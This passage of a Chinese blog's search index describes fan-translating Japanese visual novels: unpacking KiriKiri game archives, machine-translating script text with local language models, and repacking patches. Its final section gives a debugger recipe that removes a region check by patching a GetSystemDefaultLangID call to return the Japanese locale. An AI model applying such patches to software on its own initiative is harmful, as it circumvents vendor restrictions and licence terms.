\u7684\u8bdd\uff0c\u4e00\u822c\u9009\u62e9 <code>event.xp3</code> \uff0c\u62d6\u52a8\u5230\u8be5\u7a97\u53e3\u4e0a\u5e76\u9009\u62e9 <code>PNG</code> \u683c\u5f0f\u89e3\u5305</p> <p>KRKR \u5f15\u64ce\u7684\u6587\u672c\u4e00\u822c\u4f4d\u4e8e <code>scn.xp3</code> \u5185\uff0c\u5982\u679c\u4f60\u6ca1\u627e\u5230\u8be5\u8d44\u6e90\u6587\u4ef6\uff0c\u90a3\u5b83\u5176\u5b9e\u662f\u88ab\u6574\u5408\u5728 <code>data.xp3</code> \u6587\u4ef6\u5185\u4e86\uff0c\u91cc\u9762\u53ef\u80fd\u662f\u4ee5 <code>.ks</code> \u6216 <code>.scn</code> \u7ed3\u5c3e\u7684\u811a\u672c\u6587\u4ef6</p>"},{"location":"blog/Galgame/%E6%B1%89%E5%8C%96/#_2","title":"\u5176\u5b83","text":"<p>https://blog.ztjal.info/acg/acg-data/some-galgame-unpack-tools-website</p> <p>\u8fd9\u662f\u4e00\u4e2a\u70ed\u8877\u4e8e\u89e3\u5305\u7684\u5927\u4f6c\u641e\u7684\u7f51\u7ad9\uff0c\u8be5\u9875\u9762\u5305\u542b\u76f8\u5f53\u591a\u7684\u89e3\u5305\u7528\u5de5\u5177\uff0c\u4f9b\u67e5\u9605\u4f7f\u7528</p> <p>\u4e00\u4e9b\u89e3\u5305\u6216\u662f\u6c49\u5316\u5e38\u7528\u7684\u5de5\u5177\uff1a</p> <ul> <li>Releases \u00b7 morkt/GARbro (github.com)</li> <li>arcusmaximus/VNTranslationTools: Tools for translating visual novels (github.com)</li> <li>arcusmaximus/KirikiriTools: Tools for the Kirikiri visual novel engine (github.com)</li> <li>Releases \u00b7 UlyssesWu/FreeMote (github.com)</li> </ul>"},{"location":"blog/Galgame/%E6%B1%89%E5%8C%96/#_3","title":"\u6c49\u5316","text":"<p>\u4ed4\u7ec6\u9605\u8bfb\u8bf4\u660e\uff0c\u5373\u53ef\u4e86\u89e3\u5982\u4f55\u4f7f\u7528</p> <ul> <li>SakuraLLM/SakuraLLM: \u9002\u914d\u8f7b\u5c0f\u8bf4/Galgame\u7684\u65e5\u4e2d\u7ffb\u8bd1\u5927\u6a21\u578b (github.com)<ul> <li>Sakura\u6a21\u578b\u672c\u5730\u90e8\u7f72\u6559\u7a0b (fishhawk.top)</li> </ul> </li> <li>GalTransl: \u652f\u6301GPT-3.5/GPT-4/Newbing/Sakura\u7b49\u5927\u8bed\u8a00\u6a21\u578b\u7684Galgame\u81ea\u52a8\u5316\u7ffb\u8bd1\u89e3\u51b3\u65b9\u6848 Automated translation solution for visual novels supporting GPT-3.5/GPT-4/Newbing/Sakura (github.com)</li> </ul>"},{"location":"blog/Galgame/%E6%B1%89%E5%8C%96/#_4","title":"\u3042\u304d\u3086\u3081\u304f\u304f\u308b","text":"<p>\u7b2c\u4e00\u4e2a\u679c\u7136\u8fd8\u662f\u62ff KRKR \u5f15\u64ce\u7684\u6765\u8bd5\u8bd5\u624b</p> <p>\u9996\u5148\u4f7f\u7528 GARbro \u63d0\u53d6\u51fa <code>data.xp3</code> \u5185\u7684 scn \u6587\u4ef6\u5939\uff0c\u91cc\u9762\u90fd\u662f\u547d\u540d\u4e3a <code>00_prologue_01.txt.scn</code> \u7684\u6587\u4ef6</p> <p>\u6b64\u65f6\u53ef\u4ee5\u5148\u7528 Freemote \u6765\u5bf9 <code>.scn</code> \u8fdb\u884c\u89e3\u5c01\uff1a</p> <p>(\u5728\u628a Freemote \u76ee\u5f55\u6dfb\u52a0\u8fdb\u73af\u5883\u7684\u6761\u4ef6\u4e0b) \u5728\u8be5\u6587\u4ef6\u7684\u6839\u76ee\u5f55\u4f7f\u7528\u547d\u4ee4 <code>PsbDecompile 00_prologue_01.txt.scn</code> \uff0c\u63d0\u53d6\u51fa\u4fe9\u4e2a <code>json</code> \u6587\u4ef6\uff0c\u53ea\u9700\u8981\u770b\u7b2c\u4e00\u4e2a\u5373\u53ef(\u4e0d\u5e26 <code>.resx</code> \u7684)</p> <p>\u6253\u5f00\u63d0\u53d6\u51fa\u7684 <code>json</code> \u6587\u4ef6\u5e76\u5f80\u4e0b\u7ffb\u7ffb\uff0c\u53ef\u4ee5\u627e\u5230 <code>texts</code> \u90e8\u5206\uff0c\u56fe\u4e2d\u6211\u5df2\u7ecf\u628a\u7b2c\u4e00\u53e5\u8bdd\u624b\u52a8\u7ffb\u8bd1\u4e86\u4e00\u4e0b\uff0c\u7528\u4f5c\u67e5\u770b\u6c49\u5316\u80fd\u5426\u6210\u529f\u7684\u5c1d\u8bd5</p> <p></p> <p>\u4fee\u6539\u5b8c\u540e\uff0c\u4f7f\u7528 <code>PsBuild .\\00_prologue_01.txt.json</code> \u5c01\u5305\uff0c\u5e76\u5c06\u8f93\u51fa\u6587\u4ef6\u91cd\u547d\u540d\u4e3a\u539f\u6765\u7684 <code>00_prologue_01.txt.scn</code></p> <p>\u5728\u6e38\u620f\u6839\u76ee\u5f55\u65b0\u5efa\u6587\u4ef6\u5939 <code>ProjectDir</code> \uff0c\u5c06\u6539\u597d\u7684\u6587\u4ef6\u653e\u5165\u91cc\u9762\uff0c\u4f7f\u7528 <code>krkrextract</code> \u6253\u5f00\u6e38\u620f\u672c\u4f53\uff0c\u70b9\u51fb <code>Make Universal Patch</code> \u6309\u94ae\uff0c\u5b83\u4f1a\u4e3a\u6211\u4eec\u751f\u6210\u4e00\u4e2a\u540d\u4e3a <code>\u3042\u304d\u3086\u3081\u304f\u304f\u308b_Patch.exe</code> \u7684\u7a0b\u5e8f\uff0c\u6b64\u65f6\u76f4\u63a5\u8fd0\u884c\u5e76\u67e5\u770b\u6587\u672c\u7b2c\u4e00\u53e5\u8bdd\u662f\u5426\u4fee\u6539\u6210\u529f\uff1a</p> <p></p> <p>\u770b\u5230\u6210\u529f\u540e\uff0c\u5373\u53ef\u5c1d\u8bd5\u7528 Sakura \u5927\u6a21\u578b\u4ee5\u53ca Galtransl \u6765\u8fdb\u884c\u673a\u7ffb\u6c49\u5316\u4e86</p> <p>\u4e0b\u8f7d VNTranslationTools \u540e\uff0c\u53ef\u4ee5\u6253\u5f00 Galtransl \u4e2d usefultools \u5185\u7684 <code>GalTransl_DumpInjector</code> \u7684 GUI \u9875\u9762\uff0c\u8fdb\u884c\u6279\u91cf\u63d0\u53d6\u548c\u683c\u5f0f\u5316\u6587\u672c\uff1a</p> <p></p> <p>\u63d0\u53d6\u540e\u7684 <code>json</code> \u6587\u4ef6\u57fa\u672c\u683c\u5f0f\u5982\u4e0b\uff1a</p> <pre><code>  {\n    \"name\": \"\u3061\u306f\u3084\",\n    \"message\": \"\u300c\u305d\u308c\u306f\u4f55\uff1f\u3000\u30a2\u30cb\u30e1\u3068\u304b\u306b\u305d\u3046\u3044\u3046\u30ad\u30e3\u30e9\u304c\u3044\u308b\u306e\uff1f\u300d\"\n  },\n  {\n    \"name\": \"\u67da\u6708\",\n    \"message\": \"\u300c\u9055\u3046\u306e\u3002\\r\\n\u3000\u5149\u4eba\u9593\u306f\u79c1\u306e\u5984\u60f3\u306a\u306e\u300d\"\n  },\n  {\n    \"message\": \"\u30ba\u30b7\u30f3\u3001\u3068\u8179\u306e\u5e95\u306b\u30aa\u30e2\u30ea\u3092\u4e57\u305b\u3089\u308c\u305f\u6c17\u304c\u3057\u305f\u3002\"\n  },\n  {\n    \"name\": \"\u67da\u6708\",\n    \"message\": \"\u300c\u5149\u4eba\u9593\u306b\u306a\u3063\u3066\u5b87\u5b99\u3092\u99c6\u3051\u5de1\u308c\u308b\u306a\u3089\\r\\n\u3000\u8ab0\u306b\u3082\u8ff7\u60d1\u3092\u304b\u3051\u305a\u306b\u751f\u304d\u3066\u3044\u3051\u308b\u304b\u3082\u3057\u308c\u306a\u3044\u306e\u3002\\r\\n\u3000\u3060\u3051\u3069\u305d\u3093\u306a\u306e\u7121\u7406\u3060\u304b\u3089\u300d\"\n  },\n  {\n    \"name\": \"\u3061\u306f\u3084\",\n    \"message\": \"\u300c\u8ff7\u60d1\u3092\u304b\u3051\u305f\u308a\u304b\u3051\u3089\u308c\u305f\u308a\u3057\u3066\u751f\u304d\u3066\u3044\u304f\u3001\\r\\n\u3000\u3063\u3066\u9078\u629e\u80a2\u306f\u306a\u3044\u306e\uff1f\u300d\"\n  },\n</code></pre> <p>\u542f\u52a8 Sakura \u7684\u672c\u5730\u90e8\u7f72\uff0c\u6253\u5f00 Galtransl \u5e76\u6309\u7167\u6559\u7a0b\u5c06\u6b63\u786e\u7ed3\u6784\u7684\u6587\u4ef6\u5939\u7f6e\u5165\uff0c\u5373\u53ef\u5f00\u59cb\u7ffb\u8bd1\uff1a</p> <p></p> <p>\u5168\u90e8\u7ffb\u8bd1\u5b8c\u540e\u53ef\u4ee5\u7b80\u5355\u770b\u4e0b\u7ffb\u8bd1\u6548\u679c\uff0c\u518d\u636e\u6b64\u4fee\u6539\u4e00\u4e0b\u8bd1\u540e\u5b57\u5178\u3002</p> <p>\u518d\u6b21\u4f7f\u7528 <code>GalTransl_DumpInjector</code> \u5c06\u8bd1\u540e\u7684 <code>json</code> \u6587\u4ef6\u8f6c\u6362\u56de <code>scn</code> \u6587\u4ef6\uff0c\u76f4\u63a5\u5168\u9009\u7528 GARBro \u6253\u5305\u4e3a <code>patch.xp3</code> \uff0c\u653e\u5728\u6839\u76ee\u5f55\u4e0b\uff0c\u57fa\u672c\u7684\u6c49\u5316\u5de5\u4f5c\u5c31\u5b8c\u6210\u4e86\u3002</p> <p>\u4e0d\u5e78\u7684\u662f\uff0c\u7531\u4e8e\u65e5\u6587\u5b57\u4f53\u95ee\u9898\uff0c\u5f88\u591a\u65f6\u5019\u4f1a\u9047\u5230\u6587\u672c\u65f6\u7c97\u65f6\u7ec6\u7684\u60c5\u51b5</p> <p></p> <p>\u56e0\u6b64\u5bc4\u5e0c\u671b\u4e8e\u66ff\u6362\u5b57\u4f53\uff0c\u7ecf\u53d1\u73b0\uff0c\u4f7f\u7528 krkrextract \u8fdb\u884c\u4e00\u6b21 Make Universal Patch \u540e\uff0c\u518d\u6253\u5f00\u5c31\u6ca1\u6709\u8fd9\u4e2a\u95ee\u9898\u4e86\uff0c\u4f46\u662f\u600e\u4e48\u5236\u4f5c\u8865\u4e01\u6587\u4ef6\u6682\u65f6\u8fd8\u6ca1\u6709\u641e\u61c2</p> <p>\u4e0d\u8fc7\u8fd9\u6e38\u620f\u4e5f\u53ef\u4ee5\u5728\u4e0a\u9762\u83dc\u5355\u66f4\u6362\u5b57\u4f53\uff0c\u4e5f\u65e0\u6240\u8c13\u5566</p>"},{"location":"blog/Galgame/%E6%B1%89%E5%8C%96/#ambitious-mission-fd2","title":"Ambitious Mission FD2","text":"<p>\u7528\u7684\u662f krkrz \u5f15\u64ce\uff0c\u4f46\u662f\u4e0d\u80fd\u7528 krkrextract \u6216\u8005 garbro \u5f88\u65b9\u4fbf\u62c6\u51fa scn \u6587\u4ef6\uff0c\u53ea\u80fd\u7528 krkrdump \u6216\u8005 krkrzextract \uff0c\u901a\u8fc7\u8fc7\u4e00\u904d\u6e38\u620f\u6765\u83b7\u53d6\u6587\u672c</p> <p>\u5c1d\u8bd5\u4fee\u6539\u7b2c\u4e00\u53e5\u8bdd\u518d\u5c01\u5305\u56de\u53bb\uff0c\u521b\u5efa ProjectDir \u6587\u4ef6\u5939\u5e76\u653e\u5165\u4fee\u6539\u540e scn \uff0c\u4f7f\u7528 krkrextract \u5236\u4f5c Universal Patch \u3002\u4e0d\u8fc7\u5236\u4f5c\u51fa\u6765\u7684 exe \u5e76\u4e0d\u80fd\u8fd0\u884c\uff0c krkrextract \u5927\u62b5\u662f\u4e0d\u884c\u7684</p> <p>\u5728 arcusmaximus/KirikiriTools \u8fd9\u4e2a\u4ed3\u5e93\u91cc\u770b\u5230\u4e00\u4e2a\u5f88\u65b9\u4fbf\u7684\u52a8\u6001\u94fe\u63a5\u5e93 <code>version.dll</code> \uff0c\u53ea\u8981\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a <code>unencrypted</code> \u7684\u6587\u4ef6\u5939\u540c\u6837\u53ef\u4ee5\u8fbe\u5230\u514d\u5c01\u5305\u7684\u6548\u679c\uff0c\u9042\u91c7\u7528</p> <p>\u4f46\u662f\u5236\u4f5c\u6c49\u5316\u8865\u4e01\u6700\u597d\u8fd8\u662f\u8981\u5c01\u5305\u7684\uff0c\u53ef\u4ee5\u4f7f\u7528 Enigma Virtual Box \uff0c\u9009\u62e9 <code>unencrypted</code> , <code>version.dll</code> , <code>ambitious mission after2.exe</code> \u8fdb\u884c\u5c01\u88c5\uff0c\u751f\u6210\u4e00\u4e2a\u65b0 exe \u6587\u4ef6</p> <p>\u8fd9\u65f6\u8fd8\u4e0d\u80fd\u76f4\u63a5\u8fd0\u884c\uff0c\u8981\u590d\u5236\u4e00\u4efd\u539f exe \u7a0b\u5e8f\u5bf9\u5e94\u7684 sig \u6587\u4ef6\u5e76\u5c06\u5176\u6539\u540d\u4e3a\u4f60\u7684\u65b0 exe \u6587\u4ef6\u5bf9\u5e94\u7684 sig \u6587\u4ef6\uff0c\u8fd9\u65f6\u5c31\u53ef\u4ee5\u8fd0\u884c\u4e86</p>"},{"location":"blog/Galgame/%E6%B1%89%E5%8C%96/#dc4-sweet-harmony","title":"D.C.4 Sweet Harmony","text":"<p>Garbro \u63d0\u53d6\u7684 scn \u8c8c\u4f3c\u6709\u89e3\u5bc6\u9519\u8bef\uff0c\u4f46\u662f\u53ef\u4ee5\u7528 krkrextract \u89e3\u5305</p> <p>\u6b63\u5e38\u89e3\u5305\u7ffb\u8bd1\u5c01\u56de scn \u6587\u4ef6\u540e\uff0c\u4f7f\u7528 Garbro \u5c01\u5305\u5e76\u547d\u540d\u4e3a <code>patch.xp3</code> \uff0c\u5e76\u628a krkrtools \u63d0\u4f9b\u7684 <code>version.dll</code> \u590d\u5236\u8fdb\u6839\u76ee\u5f55\u5c31\u53ef\u4ee5\u770b\u5230\u6c49\u5316\u6210\u529f\u4e86</p>"},{"location":"blog/Galgame/%E6%B1%89%E5%8C%96/#mindead-blood","title":"MinDeaD BlooD \u8f93\u8840\u7bb1","text":"<p>\u9ed1C\u7684\u8001\u6e38\u620f\uff0c\u6587\u672c\u7684 <code>.spt</code> \u6587\u4ef6\u5c31\u6f0f\u5728\u5916\u9762\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>VNTextTool</code> \u89e3\u5305\u7136\u540e\u7ffb\u8bd1\u5373\u53ef</p> <p>\u5c01\u5305\u56de\u53bb\u65f6\u8bb0\u5f97\u6309\u7167\u4ed3\u5e93\u91cc\u5199\u7684\u4f7f\u7528 shiftjis \u66ff\u6362\u6a21\u5f0f\uff0c\u7528 hook \u66ff\u6362\u5b57\u7b26</p>"},{"location":"blog/Galgame/%E6%B1%89%E5%8C%96/#_5","title":"\u8ee2\u6027\u9b54\u738b\u3055\u307e\u306f\u52c7\u8005\u306b\u52dd\u3066\u306a\u3044\uff01","text":"<p>SoftPal\u7684\u5de5\u5177 github \u4e0a\u6709\u5f88\u591a\uff0c\u4f46\u662f\u8fd9\u4e2a exe \u6539\u7f16\u7801\u6709\u70b9\u770b\u4e0d\u61c2\u4e86\u3002\u770b\u522b\u4eba\u8865\u4e01\u662f\u7528 dll hook\u7684\uff0c\u6709\u65f6\u95f4\u7814\u7a76\u4e0b\u3002</p>"},{"location":"blog/Galgame/%E6%B1%89%E5%8C%96/#_6","title":"\u53bb\u9664\u533a\u57df\u8ba4\u8bc1","text":"<p>\u53ef\u4ee5\u4f7f\u7528OD\u6216\u8005x64dbg\u6539\uff0c\u4e0d\u8fc7x64dbg\u9700\u8981\u5148\u4f7f\u7528LordPE\u53bb\u9664redirect\u540e\u518d\u6539\uff08\u52fe\u9009\u91cd\u5b9a\u5411\u5df2\u5206\u79bb\uff09</p> <p>OD\uff08\u53ef\u80fd\u9700\u8981\u5168\u82f1\u6587\u8def\u5f84\uff0c\u5426\u5219\u53ef\u80fd\u8fdb\u4e0d\u5230\u65ad\u70b9\u5c31\u76f4\u63a5\u9000\u51fa\uff09\uff1a\u4f7f\u7528OD\u6253\u5f00 exe \u540e\uff0cF9\u8fd0\u884c\u7a0b\u5e8f\u81f3\u8fdb\u5165\u4e3b\u6a21\u5757\uff0c\u5728CPU\u7a97\u53e3\u4e2dCtrl+N\uff08\u6216\u53f3\u952e-&gt;\u67e5\u627e-&gt;\u5f53\u524d\u6a21\u5757\u4e2d\u7684\u540d\u79f0\uff09\uff0c\u67e5\u627e<code>GetSystemDefaultLangID</code>\uff0c\u67e5\u627e\u51fd\u6570\u53c2\u8003\uff0c\u53cc\u51fb\u8df3\u8f6c\u81f3\u51fd\u6570\u8c03\u7528\u5904</p> <p>\u7136\u540e\u76f4\u63a5\u8fd4\u56de0x411\uff08\u5c06call\u8c03\u7528\u6539\u4e3a<code>mov eax, 411</code>\uff09</p> <p>\u66f4\u6539\u5b8c\u540e\u5728CPU\u7a97\u53e3\u53f3\u952e-&gt;\u590d\u5236\u5230\u53ef\u6267\u884c\u6587\u4ef6-&gt;\u6240\u6709\u4fee\u6539\uff0c\u4e4b\u540e\u4fdd\u5b58\u6587\u4ef6\u5373\u53ef</p> <p>\u6211\u8fd8\u6ca1\u9047\u5230\u8fd9\u79cd\u60c5\u51b5\uff0c\u56e0\u6b64\u5148\u4ece\u522b\u4eba\u90a3\u91cccopy\u4e0b\u6765\uff0c\u4e4b\u540e\u518d\u6539</p>"}]}